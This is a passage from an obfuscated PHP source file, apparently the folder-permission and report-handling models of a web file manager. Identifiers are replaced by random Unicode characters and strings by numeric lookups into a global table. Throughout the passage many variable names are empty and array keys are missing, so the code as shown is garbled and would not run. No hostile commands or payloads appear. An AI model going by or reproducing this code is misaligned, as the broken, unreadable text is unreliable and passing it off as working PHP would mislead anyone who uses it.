Model($̓[927])->sourceListInfo($؏, !0); foreach ($Ӭ as $œ => &$׺ې) { $Ɣғ = $׺ې[$̓[1586]]; $׺ې[$̓[2350]] = $Ɛ[$Ɣғ] ? $Ɛ[$Ɣғ] : !1; if (!$׺ې[$̓[2350]] || $׺ې[$̓[2350]][$̓[844]] != $̓[91]) { unset($Ӭ[$œ]); continue; } $ = $׺ې[$̓[191]]; $׺ې[$̓[90]] = $΍[$] ? $΍[$] : !1; if ($׺ې[$̓[90]][$̓[520]] == $̓[91]) { unset($Ӭ[$œ]); } if ($׺ې[$̓[90]] != $̓[228] && !$׺ې[$̓[90]]) { unset($Ӭ[$œ]); } } unset($׺ې); $Ӭ = array_values($Ӭ); } private function _makeOrder($ = '') { $ߘ =& $_SERVER[]; $ݧ = array($ߘ[231], $ߘ[856], $ߘ[2334], $ߘ[2335]); $ = array($ߘ[537] => $ߘ[538], $ߘ[539] => $ߘ[540]); $õ = Input::get($ߘ[544], $ߘ[7], $ߘ[512], $ݧ); $è͗ = Input::get($ߘ[545], $ߘ[7], $ߘ[2351], array($ߘ[2270], $ߘ[539])); $è͗ = $[$è͗]; $ = $ . "{$õ}\x20{$è͗}"; return $this->order($); } public function reportAdd($Ӌ) { $ϓɾ =& $_SERVER[]; $𞼯 = array($ϓɾ[687] => $Ӌ[$ϓɾ[687]], $ϓɾ[1586] => USER_ID); if (Model($ϓɾ[2346])->where($𞼯)->find()) { return !1; } $ҁߎ = array($ϓɾ[687] => $Ӌ[$ϓɾ[687]], $ϓɾ[1859] => $Ӌ[$ϓɾ[1859]], $ϓɾ[191] => $Ӌ[$ϓɾ[191]], $ϓɾ[557] => $Ӌ[$ϓɾ[557]], $ϓɾ[1586] => USER_ID, $ϓɾ[33] => $Ӌ[$ϓɾ[33]], $ϓɾ[540] => $Ӌ[$ϓɾ[540]]); return Model($ϓɾ[2346])->add($ҁߎ); } public function reportList($݈ϒ) { $ =& $_SERVER[]; $̊ = array(); if ($݈ϒ[$[855]]) { $ = $݈ϒ[$[856]] ? $݈ϒ[$[856]] : strtotime(date($[2349])); $̊[$[231]] = array($[408], array($݈ϒ[$[855]], $)); } if (isset($݈ϒ[$[33]]) && in_array($݈ϒ[$[33]], array($[91], $[524], $[2352], $[2353], $[2354]))) { $̊[$[33]] = $݈ϒ[$[33]]; } if (isset($݈ϒ[$[844]]) && in_array($݈ϒ[$[844]], array($[228], $[91], $[524], $[2352]))) { $̊[$[844]] = $݈ϒ[$[844]]; } $ = Input::get($[545], $[7], $[2351], array($[2270], $[539])); $Ό = array($[537] => $[538], $[539] => $[540]); $ٹ = $[2355] . $Ό[$]; $𡷤 = Model($[2346])->where($̊)->order($ٹ)->selectPage(20); if (empty($𡷤[$[446]])) { return array(); } $Ű = array_to_keyvalue_group($𡷤[$[446]], $[844], $[687]); if (!empty($Ű[0])) { $݈ϒ = $Ű[0]; $̊ = array($[687] => array($[7], $݈ϒ)); $ = $this->where($̊)->field($[687])->select(); $ = array_to_keyvalue($, $[12], $[687]); $ٝ = array_diff($݈ϒ, $); if (!empty($ٝ)) { foreach ($𡷤[$[446]] as $ջ => $Χؽ) { if (in_array($Χؽ[$[687]], $ٝ)) { unset($𡷤[$[446]][$ջ]); } } } } $this->_listDataApply($𡷤[$[446]]); return $𡷤; } public function reportStatus($䓠֙) { $ժ =& $_SERVER[]; $ҁ = array($ժ[487] => $䓠֙[$ժ[487]]); $ = Model($ժ[2346])->where($ҁ)->field($ժ[2356])->find(); if (!$) { return !1; } $Ѡ = array($ժ[844] => $䓠֙[$ժ[844]]); if ($䓠֙[$ժ[844]] == $ժ[2352] && $[$ժ[844]] == $ժ[2352]) { $Ѡ[$ժ[844]] = 0; } $߫ = Model($ժ[2346])->where($ҁ)->save($Ѡ); if ($䓠֙[$ժ[844]] == $ժ[524]) { if ($[$ժ[557]] != $ժ[228] && $this->shareFileMeta($[$ժ[557]])) { $this->shareFileMeta($[$ժ[557]], 0); } $this->remove($[$ժ[687]]); return !0; } if ($߫ && $䓠֙[$ժ[844]] == $ժ[2352]) { $Ң = $Ѡ[$ժ[844]] == $ժ[2352] ? 1 : 0; $this->shareFileMeta($[$ժ[557]], $Ң); $this->removeByFile($[$ժ[557]]); } return $߫; } private function removeByFile($) { $ =& $_SERVER[]; $ = Model($[927])->where(array($[557] => $))->field($[191])->select(); $з = array_to_keyvalue($, $[12], $[191]); $̴ = array($[191] => array($[7], $з), $[578] => 1); $ = $this->where($̴)->field($[687])->select(); if (empty($)) { return; } $ = array_to_keyvalue($, $[12], $[687]); $this->remove($); } private function shareFileMeta($țἶ, $ = null) { $ʟ =& $_SERVER[]; $ = array($ʟ[557] => $țἶ, $ʟ[95] => $ʟ[2357]); if (is_null($)) { return Model($ʟ[2358])->where($)->find(); } $[$ʟ[451]] = $; Model($ʟ[2358])->add($, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\143\145\x5f\x61\165\164\150"; public function getAuth($ԑ) { $ڂ㽻 =& $_SERVER[]; $ = $this->sourceAuthSelect($ԑ); $뮈 = array(); $ = array(); $ƕ = 2 << 25; foreach ($ as $) { $ = Model($ڂ㽻[591])->listData($[$ڂ㽻[1634]]); if (!$) { continue; } $뮈[] = $; $ֺ = 0; if ($[$ڂ㽻[188]] == SourceModel::TYPE_GROUP) { $ֺ = $ƕ * 2; } if ($[$ڂ㽻[188]] == SourceModel::TYPE_USER) { $ֺ = $ƕ; } if ($[$ڂ㽻[188]] == SourceModel::TYPE_USER && $[$ڂ㽻[589]] == $ڂ㽻[228]) { $ֺ = 0; } $[] = $[$ڂ㽻[502]] + $ֺ; } array_multisort($, SORT_DESC, $뮈); return $뮈; } public function sourceAuthSelect($) { $׀Ċ =& $_SERVER[]; static $Ԋ = array(); $ƺ = is_array($) ? !1 : !0; if ($ƺ) { $ = array($); } $ = array(); foreach ($ as $ྷ) { if (isset($Ԋ[$ྷ])) { $[$ྷ] = $Ԋ[$ྷ]; } } if (count($) == count($)) { return $ƺ ? $[$[0]] : $; } $ = $׀Ċ[2359]; $Ӏ = array($׀Ċ[191] => array($׀Ċ[7], $)); $͊ = $this->field($)->order($׀Ċ[487])->where($Ӏ)->select(); $ؑ = array_to_keyvalue_group($͊, $׀Ċ[191]); foreach ($ as $ྷ) { $Ԋ[$ྷ] = $ؑ[$ྷ] ? $ؑ[$ྷ] : array(); } if ($ƺ) { return $͊; } return $ؑ; } public function setAuth($͚Ϟ, $) { $ȵ =& $_SERVER[]; $ = Model($ȵ[1527])->sourceInfo($͚Ϟ); if (!$) { return !1; } if ($[$ȵ[188]] != SourceModel::TYPE_GROUP) { return !1; } $ͅ = 1; $ = $[$ȵ[589]]; if ($ != $ͅ) { $ݦ = array($ȵ[1489] => $); $ = Model($ȵ[2269])->field($ȵ[1586])->where($ݦ)->select(); $ = array_to_keyvalue($, $ȵ[12], $ȵ[1586]); } $ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ʶ = array(); foreach ($ as $) { if (!in_array($[$ȵ[188]], $)) { show_json(LNG($ȵ[2360]), !1); } if ($ != $ͅ) { if ($[$ȵ[188]] == SourceModel::TYPE_GROUP) { } if ($[$ȵ[589]] != 0 && !in_array($[$ȵ[589]], $)) { } } if ($[$ȵ[589]] == 0) { $[$ȵ[188]] = SourceModel::TYPE_USER; } $ʶ[] = array($ȵ[191] => $͚Ϟ, $ȵ[188] => intval($[$ȵ[188]]), $ȵ[589] => intval($[$ȵ[589]]), $ȵ[1634] => intval($[$ȵ[1634]]) ? intval($[$ȵ[1634]]) : 0, $ȵ[2338] => intval($[$ȵ[2338]]) ? intval($[$ȵ[2338]]) : -1); } $this->where(array($ȵ[506] => $͚Ϟ))->delete(); $this->addAll($ʶ); return !0; } public function authClear($) { $ͻ =& $_SERVER[]; $ = Model($ͻ[1527])->sourceInfo($); $ = array($); if ($[$ͻ[500]] == $ͻ[91]) { $ = array($ͻ[674] => array($ͻ[635], $[$ͻ[604]] . $ . $ͻ[636])); $ = Model($ͻ[1527])->field($ͻ[506])->where($)->getField($ͻ[191], !0); $[] = $; } $this->where(array($ͻ[506] => array($ͻ[507], $)))->delete(); return !0; } public function getAllParent($幢) { $ޓ =& $_SERVER[]; $ = Model($ޓ[1527])->sourceInfo($幢); if (!$ || $[$ޓ[188]] != SourceModel::TYPE_GROUP) { return array(); } $Ƈ = Model($ޓ[1527])->parentLevelArray($[$ޓ[604]]); $ػﴮ = array_merge(array(intval($幢)), array_reverse($Ƈ)); $ = $this->sourceAuthSelect($ػﴮ); $ = $GLOBALS[$ޓ[6]][$ޓ[92]][$ޓ[2282]] == 1; $Ĵ = $ ? 3 : 2; $öԴ = Model($ޓ[1487])->getInfo($[$ޓ[589]]); $ = explode($ޓ[50], trim($öԴ[$ޓ[604]], $ޓ[50])); $듮 = array_merge(array($öԴ[$ޓ[1489]]), array_reverse(array_slice($, $Ĵ))); foreach ($ as $幢 => $鍱ą) { foreach ($鍱ą as $϶) { if (!$϶ || !$϶[$ޓ[589]] || $϶[$ޓ[589]] == $ޓ[228]) { continue; } if ($϶[$ޓ[188]] != SourceModel::TYPE_GROUP) { continue; } $듮[] = $϶[$ޓ[589]]; } } $듮 = array_unique($듮); $ = array($ޓ[428] => _get($GLOBALS[$ޓ[7]], $ޓ[428], 1), $ޓ[439] => _get($GLOBALS[$ޓ[7]], $ޓ[439], 500)); $GLOBALS[$ޓ[7]][$ޓ[428]] = 1; $GLOBALS[$ޓ[7]][$ޓ[439]] = 500; $Ź = array($ޓ[508] => 0, $ޓ[2181] => AuthModel::authAll(), $ޓ[509] => LNG($ޓ[2361]), $ޓ[2196] => $ޓ[2362]); $ᚭ = array(); $뎦 = explode($ޓ[50], $ޓ[2363]); $̑щ = explode($ޓ[50], $ޓ[2364]); foreach ($듮 as $Π) { $ݔ = Model($ޓ[1487])->getInfo($Π); $۔ = array_field_key($ݔ, $뎦); $ = Model($ޓ[617])->listByGroup($Π); foreach ($[$ޓ[446]] as $ => $Ăӝ) { $this->userGroupList($Ăӝ[$ޓ[1586]], $Ăӝ); $Ԩϰ = $Ăӝ[$ޓ[1586]] . $ޓ[12]; if (isset($ᚭ[$Ԩϰ])) { continue; } $׬ = Model($ޓ[2365])->listData($Ăӝ[$ޓ[2366]]); $Ăӝ[$ޓ[2367]] = Action($ޓ[2368])->parseUrl($Ăӝ[$ޓ[2367]]); $Ăӝ[$ޓ[1935]] = $׬ && $׬[$ޓ[2369]] == 1; $ = $this->groupRootAuth($Π, $Ăӝ[$ޓ[1586]]); $ = $Ăӝ[$ޓ[1935]] ? $Ź : $; $ᚭ[$Ԩϰ] = array($ޓ[2370] => $ޓ[2371], $ޓ[2372] => LNG($ޓ[2373]), $ޓ[2350] => array_field_key($Ăӝ, $̑щ), $ޓ[502] => $, $ޓ[503] => $[$ޓ[502]], $ޓ[2374] => $۔); } } $GLOBALS[$ޓ[7]][$ޓ[428]] = $[$ޓ[428]]; $GLOBALS[$ޓ[7]][$ޓ[439]] = $[$ޓ[439]]; foreach ($ as $幢 => $鍱ą) { if (!$鍱ą) { continue; } foreach ($鍱ą as $϶) { if (!$϶ || !$϶[$ޓ[589]] || $϶[$ޓ[589]] == $ޓ[228]) { continue; } if ($϶[$ޓ[188]] != SourceModel::TYPE_USER) { continue; } $Ԩϰ = $϶[$ޓ[589]] . $ޓ[12]; if (isset($ᚭ[$Ԩϰ])) { continue; } $ủ = $this->authMake($鍱ą, $Ԩϰ); if (!$ủ || !$ủ[$ޓ[2372]]) { continue; } $ᚭ[$Ԩϰ] = array($ޓ[2370] => $ޓ[2375], $ޓ[2372] => $ủ[$ޓ[2372]], $ޓ[2350] => Model($ޓ[617])->getInfoSimpleOuter($Ԩϰ), $ޓ[502] => $ủ[$ޓ[556]], $ޓ[503] => $ủ[$ޓ[556]][$ޓ[502]], $ޓ[2374] => $ủ[$ޓ[2376]]); } } foreach ($ as $幢 => $鍱ą) { if (!$鍱ą) { continue; } foreach ($ᚭ as $Ԩϰ => $ԣ) { if ($ԣ[$ޓ[2350]][$ޓ[1935]] || $ԣ[$ޓ[2370]] == $ޓ[2375]) { continue; } $ủ = $this->authMake($鍱ą, $Ԩϰ); if (!$ủ || !$ủ[$ޓ[2372]]) { continue; } $ᚭ[$Ԩϰ] = array($ޓ[2370] => $ޓ[2375], $ޓ[2372] => $ủ[$ޓ[2372]], $ޓ[2350] => $ԣ[$ޓ[2350]], $ޓ[502] => $ủ[$ޓ[556]], $ޓ[503] => $ủ[$ޓ[556]][$ޓ[502]], $ޓ[2374] => $ủ[$ޓ[2376]]); } } $ᚭ = array_sort_by($ᚭ, $ޓ[503], $ޓ[540]); return $ᚭ; } public function getAllChildren($ì) { $茊 =& $_SERVER[]; $¤ķ = Model($茊[1527])->sourceInfo($ì); if ($¤ķ[$茊[500]] != $茊[91]) { return $this->sourceListAuth(array($ì)); } if ($¤ķ[$茊[188]] != SourceModel::TYPE_GROUP) { return array(); } $ = 1; $ = array($ì); if ($¤ķ[$茊[190]] == $茊[228] && $¤ķ[$茊[589]] != $) { $ = $this->groupChidldAllRootSource($¤ķ[$茊[589]]); } $˃ = $this->field($茊[191])->group($茊[191])->select(); $˃ = array_to_keyvalue($˃, $茊[12], $茊[191]); if (!$˃) { return array(); } $ = $茊[2377]; $ʉ = array($茊[191] => array($茊[7], $˃), $茊[520] => $茊[228]); $ = Model($茊[927])->field($)->where($ʉ)->select(); $ʞ倷 = array($ì); foreach ($ as $) { foreach ($ as $᢯) { $ĕ = $茊[50] . $᢯ . $茊[50]; $ = $[$茊[604]] . $[$茊[191]] . $茊[50]; if (strstr($, $ĕ)) { $ʞ倷[] = $[$茊[191]]; break; } } } return $this->sourceListAuth($ʞ倷); } private function sourceListAuth($ݗ) { $͗ =& $_SERVER[]; $ݽ = Model($͗[1527])->sourceListInfo($ݗ, !0); $ζ = $this->sourceAuthSelect($ݗ); $穆 = array(); $ = array(); foreach ($ݽ as $Ȝ) { unset($Ȝ[$͗[543]]); unset($Ȝ[$͗[541]]); unset($Ȝ[$͗[502]]); unset($Ȝ[$͗[90]]); $֤՘ = $ζ[$Ȝ[$͗[191]]]; if (!$֤՘) { continue; } $Ȝ[$͗[2374]] = $this->authTargetInfo($֤՘); $Ȝ[$͗[602]] = rtrim($Ȝ[$͗[608]], $͗[8]) . $͗[8] . ltrim($Ȝ[$͗[602]], $͗[8]); $穆[] = $Ȝ; $ = count(explode($͗[8], trim($Ȝ[$͗[602]], $͗[8]))); $[] = $ + ($Ȝ[$͗[33]] == $͗[78] ? 0 : 1000); } array_multisort($, SORT_ASC, $穆); return $穆; } private function groupChidldAllRootSource($) { $ =& $_SERVER[]; $ = Model($[1487])->groupChildrenAll($); $ = array($[190] => 0, $[589] => array($[7], $), $[188] => SourceModel::TYPE_GROUP); $޵ = Model($[927])->field($[191])->where($)->select(); $޵ = array_to_keyvalue($޵, $[12], $[191]); return $޵; } private function authTargetInfo($ׯ) { $ƢȊ =& $_SERVER[]; $Ļ = array(); $ű = array(); $ = 2 << 25; foreach ($ׯ as $ũ) { $ϝʹ = Model($ƢȊ[591])->listData($ũ[$ƢȊ[1634]]); if (!$ϝʹ) { continue; } if ($ũ[$ƢȊ[188]] == SourceModel::TYPE_USER) { $ = Model($ƢȊ[597])->getInfoSimpleOuter($ũ[$ƢȊ[589]]); if ($[$ƢȊ[1586]] == $ƢȊ[1374]) { continue; } if ($[$ƢȊ[1586]] == $ƢȊ[228]) { $[$ƢȊ[32]] = LNG($ƢȊ[2378]); } } else { $ = Model($ƢȊ[605])->getInfoSimple($ũ[$ƢȊ[589]]); } if (!$) { continue; } $[$ƢȊ[556]] = $ϝʹ; $Ļ[] = $; $ǈ = 0; if ($ũ[$ƢȊ[188]] == SourceModel::TYPE_GROUP) { $ǈ = $ * 2; } if ($ũ[$ƢȊ[188]] == SourceModel::TYPE_USER) { $ǈ = $; } if ($ũ[$ƢȊ[188]] == SourceModel::TYPE_USER && $ũ[$ƢȊ[589]] == $ƢȊ[228]) { $ǈ = 0; } $ű[] = $ϝʹ[$ƢȊ[502]] + $ǈ; } array_multisort($ű, SORT_DESC, $Ļ); return $Ļ; } public function getAllChildrenByUser($ݭ, $ԯ) { $Ո =& $_SERVER[]; $ꔗ = Model($Ո[617])->getInfo($ԯ); if (!$ԯ || !$ݭ || !$ꔗ) { return array(); } $Ϛ = Model($Ո[1527])->sourceInfo($ݭ); $י = array(); $ࣵ = 1; if ($Ϛ[$Ո[190]] == $Ո[228] && $Ϛ[$Ո[589]] != $ࣵ && $this->groupContainUser($Ϛ[$Ո[589]], $ԯ)) { foreach ($ꔗ[$Ո[1488]] as $Ӛ) { $ = Model($Ո[605])->getInfo($Ӛ[$Ո[1489]]); $ = Model($Ո[617])->getInfoSimpleOuter($ԯ); $[$Ո[556]] = $Ӛ[$Ո[502]]; if (Model($Ո[591])->authCheckAction($Ӛ[$Ո[502]][$Ո[502]], $Ո[1558])) { continue; } $ˡގ = array($Ո[32] => $Ո[1392] . $[$Ո[32]], $Ո[191] => $[$Ո[90]][$Ո[191]], $Ո[87] => KodIO::make($[$Ո[90]][$Ո[191]]), $Ո[190] => $Ո[228], $Ո[188] => $Ո[598], $Ո[33] => $Ո[639], $Ո[602] => $[$Ո[609]], $Ո[1489] => $[$Ո[1489]], $Ո[606] => $[$Ո[190]], $Ո[2374] => array($)); $י[$ˡގ[$Ո[191]]] = $ˡގ; } } $ = array(); $ = $this->getAllChildren($ݭ); foreach ($ as $) { $ = !1; foreach ($[$Ո[2374]] as $ڲ) { if ($ڲ[$Ո[1586]]) { if ($ڲ[$Ո[1586]] == $ԯ) { $ = !0; break; } } if ($ڲ[$Ո[1489]]) { if ($this->groupContainUser($ڲ[$Ո[1489]], $ԯ)) { $ = !0; break; } } } if ($) { $[] = $; } $ = $[$Ո[191]]; if (isset($י[$])) { $[$Ո[2374]][] = $י[$][0]; $י[$] = !1; } } $י = array_filter(array_values($י)); $ = array_merge($י, $); return $; } public function setAllChildrenByUser($, $ء, $릛) { $ƿ =& $_SERVER[]; $ⴝ = $this->getAllChildrenByUser($, $ء); if (!$릛 || !$ⴝ) { return !1; } foreach ($ⴝ as $δ) { $ = array(); foreach ($δ[$ƿ[2374]] as $) { $ɚ = $[$ƿ[556]]; $ޖ = $[$ƿ[1586]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $݋ = $[$ƿ[1586]] ? $[$ƿ[1586]] : $[$ƿ[1489]]; if ($[$ƿ[1586]] && $[$ƿ[1586]] == $ء) { continue; } $[] = array($ƿ[191] => $δ[$ƿ[191]], $ƿ[188] => $ޖ, $ƿ[589] => intval($݋), $ƿ[1634] => isset($ɚ[$ƿ[487]]) ? intval($ɚ[$ƿ[487]]) : 0, $ƿ[2338] => isset($ɚ[$ƿ[2338]]) ? intval($ɚ[$ƿ[2338]]) : -1); } $[] = array($ƿ[191] => $δ[$ƿ[191]], $ƿ[188] => SourceModel::TYPE_USER, $ƿ[589] => intval($ء), $ƿ[1634] => intval($릛), $ƿ[2338] => -1); $this->where(array($ƿ[506] => $δ[$ƿ[191]]))->delete(); $this->addAll($); } return !0; } public function get($ޯ) { $ާ = $this->getSourceList(array($ޯ), !0); return $ާ[0]; } public function getSourceList($深, $ӣ = false, $׫ = false) { $ů =& $_SERVER[]; if (!$深) { return array(); } $ = Model($ů[1527]); if (!$ӣ && count($深) == 1) { $ӣ = array(); $ӣ[$深[0]] = $->sourceInfo($深[0]); } if (!$ӣ) { $ = array($ů[506] => array($ů[507], $深)); $ӣ = $->field($ů[2379])->where($)->select(); $ӣ = array_to_keyvalue($ӣ, $ů[191]); } $ = $深; foreach ($ӣ as $꽆 => $Ά) { $¬ = $->parentLevelArray($Ά[$ů[604]]); $ = array_merge($, array(intval($꽆)), array_reverse($¬)); } $ = array_values(array_unique($)); if (!$) { return array(); } $َ = $this->sourceAuthSelect($); $ = array(); foreach ($ as $Ơڻ) { if (isset($َ[$Ơڻ])) { $[$Ơڻ] = $َ[$Ơڻ]; } } $¼ = $this->userIsRoot($׫); $ݴ = AuthModel::authAll(); $ϼ = array($ů[503] => $ݴ, $ů[2380] => array($ů[508] => 0, $ů[2181] => $ݴ, $ů[509] => LNG($ů[2361]), $ů[2196] => $ů[2362])); $ = array(); foreach ($ӣ as $Ơڻ => $ׄ) { if ($¼ && $GLOBALS[$ů[6]][$ů[2194]]) { $[$Ơڻ] = $ϼ; continue; } $[$Ơڻ] = $this->makeSourceAuth($ׄ, $, $׫); } return $; } public function authDeepCheck($, $ɖ = false) { $ٷ =& $_SERVER[]; $ɖ = $ɖ ? $ɖ : USER_ID; $ = $this->makeAuthDeep($ɖ); if (!in_array($, $[$ٷ[2381]])) { return !1; } $純 = array(); foreach ($[$ٷ[2382]] as $̀ђ => $Ҍ) { if (!in_array($, $Ҍ)) { continue; } $純[] = $̀ђ; } if (!$純) { return !1; } $ = $純 ? $純[0] : $; return array($ٷ[503] => -1, $ٷ[556] => array($ٷ[508] => $ٷ[1374], $ٷ[2181] => $ٷ[228], $ٷ[509] => LNG($ٷ[2383]), $ٷ[2196] => $ٷ[2384]), $ٷ[2372] => LNG($ٷ[2385]), $ٷ[2386] => $this->sourceAuthInfo($)); } protected function makeAuthDeep($ = false) { $ =& $_SERVER[]; static $Њױ = array(); $ = $ ? $ : USER_ID; if (isset($Њױ[$])) { return $Њױ[$]; } $ه = Model($[2387])->listData(); $͔ = array(); foreach ($ه as $´) { if ($´[$[502]] == 0 && $´[$[2195]] == $[91]) { $͔[] = $´[$[487]]; } } $ǎ = $this->userGroupParents($); $ú = array($[188] => SourceModel::TYPE_USER, $[589] => $); if ($ǎ) { $ú = array(array($[188] => SourceModel::TYPE_USER, $[589] => $), array($[188] => SourceModel::TYPE_GROUP, $[589] => array($[507], $ǎ)), $[1162] => $[2277]); } $ = $this->field($[2388])->where($ú)->select(); $ = array(); $ʇ = array_to_keyvalue_group($, $[191]); foreach ($ʇ as $ => $) { $ = $this->authArrayCheck($, $); if ($[$[503]] > 0) { $[] = $ . $[12]; } } if ($ǎ) { $Ғڎ = Model($[605]); foreach ($ǎ as $) { $ȟ = $Ғڎ->getInfo($); if (!$ȟ || !is_array($ȟ[$[90]])) { continue; } $[] = $ȟ[$[90]][$[191]]; } } $т = array(); $ = $ǎ; $鯺 = Model($[1527]); $Ғڎ = Model($[605]); $ë˒ = array(); $ʬ = array(); $ͯ = array(); $璹 = array(); if ($) { $ = $鯺->where(array($[191] => array($[507], $)))->select(); foreach ($ as $ව) { if ($ව[$[520]] == $[91]) { continue; } $ = $鯺->parentLevelArray($ව[$[604]]); $т = array_merge($т, $); $[] = $ව[$[589]]; $ë˒[$ව[$[191]]] = $; $ʬ[$ව[$[191]]] = $ව[$[589]]; } } $ = array_values(array_unique($)); $ؗ = $; foreach ($ؗ as $) { $ȟ = $Ғڎ->getInfo($); $ = $鯺->parentLevelArray($ȟ[$[604]]); $ = array_merge($, $); } $ = array_values(array_unique($)); foreach ($ as $) { $ȟ = $Ғڎ->getInfo($); $т[] = $ȟ[$[90]][$[191]]; $ͯ[$] = $ȟ[$[90]][$[191]]; $璹[$] = $鯺->parentLevelArray($ȟ[$[604]]); } foreach ($ë˒ as $쬉 => $齼) { $ն = $ʬ[$쬉]; if (!$ն || !$ͯ[$ն]) { continue; } $Ɠ = array(); foreach ($璹[$ն] as $) { $Ɠ[] = $ͯ[$]; } $ë˒[$쬉] = array_merge($Ɠ, $齼); } $т = array_values(array_unique($т)); $ = array($[2381] => $т, $[2382] => $ë˒); $Њױ[$] = $; return $; } private function makeSourceAuth($ꢳ, $, $ڹ = false) { $۷ =& $_SERVER[]; $ = $۷[91]; $Ꮌ = $ꢳ[$۷[589]]; $ = $ꢳ[$۷[188]] == SourceModel::TYPE_GROUP; $ш = $ ? $this->groupRootAuth($Ꮌ, $ڹ) : !1; if ($ш && Model($۷[591])->authCheckAction($ш[$۷[502]], $۷[1558])) { return $this->groupAuthInfo($ш, $Ꮌ); } $ = Model($۷[1527])->parentLevelArray($ꢳ[$۷[604]]); $ = array_merge(array($ꢳ[$۷[191]]), array_reverse($)); $ﰃ = !1; foreach ($ as $) { if (!isset($[$])) { continue; } $١ = $this->authMake($[$], $ڹ); if ($١[$۷[556]]) { $ﰃ = $١; break; } } if (!$) { return $ﰃ; } if (!$ﰃ && $ш) { $ﰃ = $this->groupAuthInfo($ш, $Ꮌ); } if (!$ﰃ) { $蔕 = Model($۷[605])->getInfo($Ꮌ); $˟ = explode($۷[50], trim($蔕[$۷[604]], $۷[50])); $˟ = array_reverse($˟); foreach ($˟ as $) { if ($ == $۷[228] || $ == $) { continue; } $Ȟ = $this->groupRootAuth($, $ڹ); if (!$Ȟ) { continue; } $ﰃ = $this->groupAuthInfo($Ȟ, $); break; } } if (!$ﰃ || $ﰃ[$۷[503]] <= 0) { $≈ = $this->authDeepCheck($ꢳ[$۷[191]], $ڹ); if ($≈) { $ﰃ = $≈; } } return $ﰃ; } private function userIsRoot($ = false) { $ =& $_SERVER[]; if (!$ && KodUser::isRoot()) { return !0; } $ = Model($[617])->getInfo($); $˥ = Model($[2365])->listData($[$[2366]]); if ($˥ && $˥[$[595]][$[2369]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ȏ) { $׸ =& $_SERVER[]; $ = Model($׸[1527]); $ّ؍Ϝ = $->sourceInfo($ȏ); if (!$ّ؍Ϝ) { return !1; } $->groupPathDisplay($ّ؍Ϝ); $Ѹ = array($ّ؍Ϝ); $Ѹ = $->_listAppendPath($Ѹ, !1); $ّ؍Ϝ = $Ѹ[0]; $ = $ّ؍Ϝ[$׸[602]]; if (isset($ّ؍Ϝ[$׸[610]])) { $失 = explode($׸[8], trim($ّ؍Ϝ[$׸[602]], $׸[8])); array_shift($失); $ = $ّ؍Ϝ[$׸[608]] . $׸[2389] . implode($׸[8], $失); } return array($׸[32] => $ّ؍Ϝ[$׸[32]], $׸[191] => $ّ؍Ϝ[$׸[191]], $׸[87] => KodIO::make($ّ؍Ϝ[$׸[191]]), $׸[602] => $); } private function groupAuthInfo($, $쑗¸) { $녤 =& $_SERVER[]; $ע = Model($녤[605])->getInfo($쑗¸); return array($녤[2390] => intval($[$녤[502]]), $녤[2380] => $, $녤[2391] => LNG($녤[2392]), $녤[2386] => array($녤[509] => $ע[$녤[32]], $녤[87] => KodIO::make($ע[$녤[90]][$녤[191]]), $녤[2393] => $ע[$녤[609]])); } protected function groupRootAuth($ġ, $ = false) { $ =& $_SERVER[]; $ = $ ? $ : USER_ID; $Ч = $ . $[2394] . $ġ; static $ = array(); if (isset($[$Ч])) { return $[$Ч]; } $ߗ = Model($[605])->getInfo($ġ); $ = $this->userGroupList($); $Ý = isset($[$ġ]) ? $[$ġ][$[502]] : !1; if ($Ý && Model($[591])->authCheckAction($Ý[$[502]], $[1558])) { $[$Ч] = $Ý; return $Ý; } $Ը = $this->sourceAuthSelect($ߗ[$[90]][$[191]]); $ʉ = $Ը ? $this->authMake($Ը, $) : !1; $ = $ʉ ? $ʉ[$[556]] : !1; $[$Ч] = $ ? $ : $Ý; return $[$Ч]; } public function authOwnerApply($) { $ =& $_SERVER[]; if (empty($[$[502]]) || isset($[$[1577]]) && $[$[1577]]) { return $; } if (AuthModel::authCheckRoot($[$[502]][$[503]])) { return $; } $𑣿 = Model($[1527])->parentLevelArray($[$[604]]); $𑣿 = array_merge(array($[$[191]]), array_reverse($𑣿)); $ߌި = $this->sourceAuthSelect($𑣿); $ʹ = array(); $㠆 = array(); foreach ($ߌި as $ => $) { $ˇǅ = $this->authFolderOwnerUser($); $ʹ[$] = $ˇǅ; $㠆 = array_merge($㠆, $ˇǅ[$[684]]); if ($ˇǅ[$[2395]]) { break; } } if (count($㠆) == 0) { $㠆 = $this->authFolderOwnerGroup($[$[589]]); } $㠆 = array_unique($㠆); if (AuthModel::authCheckRoot($[$[502]][$[503]])) { $㠆[] = USER_ID; } $[$[502]][$[2396]] = Model($[597])->userListInfo($㠆); return $; } private function authFolderOwnerGroup($䗾) { $ל =& $_SERVER[]; $ = Model($ל[2269])->where(array($ל[1489] => $䗾))->select(); $֎ = array(); if (!$) { return $֎; } foreach ($ as $뀚) { $ = $this->authInfo($뀚); if (AuthModel::authCheckRoot($[$ל[502]])) { $֎[] = $뀚[$ל[1586]]; } } return $֎; } private function authFolderOwnerUser($) { $ =& $_SERVER[]; $٫ = array(); $ = !1; foreach ($ as $ȜŐ) { $ = $this->authInfo($ȜŐ); if ($ȜŐ[$[589]] == $[228]) { $ = !0; } if ($ȜŐ[$[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($[$[502]])) { $٫[] = $ȜŐ[$[589]]; } } } return array($[684] => $٫, $[2395] => $); } public function authMake($𵁦, $ = false) { $ҽ =& $_SERVER[]; $Ժы = $this->authArrayCheck($𵁦, $); if ($Ժы[$ҽ[2376]]) { $Ժы[$ҽ[2376]] = $this->sourceAuthInfo($Ժы[$ҽ[2376]]); } return $Ժы; } public function authArrayCheck($޼, $ڰ = false) { $ܮ =& $_SERVER[]; if (!$޼) { return array($ܮ[503] => 0, $ܮ[556] => !1, $ܮ[2391] => $ܮ[12]); } $ڰ = $ڰ ? $ڰ : USER_ID; $ = 0; $ = 0; $ե = 0; $칄 = 0; $ض = 0; $ԽҮ = 0; $Ũ = 0; $ = 0; $֪ = 1000; $ = 0; $ʎ = 0; $˾ = 0; $ = 0; $ѬЂ = 0; foreach ($޼ as $Ŵً) { $ܱ = $this->authInfo($Ŵً); if (!$ܱ) { continue; } $ͫƎ = $Ŵً[$ܮ[589]]; $ = $Ŵً[$ܮ[191]]; $ = intval($ܱ[$ܮ[502]]); if ($Ŵً[$ܮ[188]] 